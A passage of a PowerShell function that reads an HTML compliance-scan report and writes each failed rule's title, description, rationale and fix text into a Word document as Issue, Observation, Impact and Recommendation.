    $WordDocument = New-WordDocument $output
    $count = 0
    foreach($i in ($rep.body.getElementsByClassName('Rule'))){
        $doc = New-Object -com "HTMLFILE"
        $doc.IHTMLDocument2_write(($i | select -ExpandProperty innerhtml))
        $res = ($doc.body.getElementsByClassName('outcome') | select -ExpandProperty outertext)
        if(($res) -and ($res -notmatch 'pass')){
            $count +=1
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Bold $true -Supress $True -Text 'Issue:'
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Supress $True -Text ($doc.body.getElementsByClassName('ruleTitle') | select -ExpandProperty outertext)
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Bold $true -Supress $True -Text 'Observation:'
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Supress $True -Text (($doc.body.getElementsByClassName('description') | where {$_.outerhtml -match '<DIV class=bold>Description:</DIV>'}).outertext.replace('Description:','').trim())
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Bold $true -Supress $True -Text 'Impact:'
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Supress $True -Text ($doc.body.getElementsByClassName('rationale') | select -ExpandProperty outertext)
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Bold $true -Supress $True -Text 'Recommendation:'
            Add-WordText -WordDocument $WordDocument -FontSize 12 -SpacingBefore 15 -Supress $True -Text ($doc.body.getElementsByClassName('fixtext') | select -ExpandProperty outertext)
        }
    }
    $out = Save-WordDocument $WordDocument -Language 'en-US'
    Write-Output "Found $count improvements"
    Write-Output "saved to $out"
}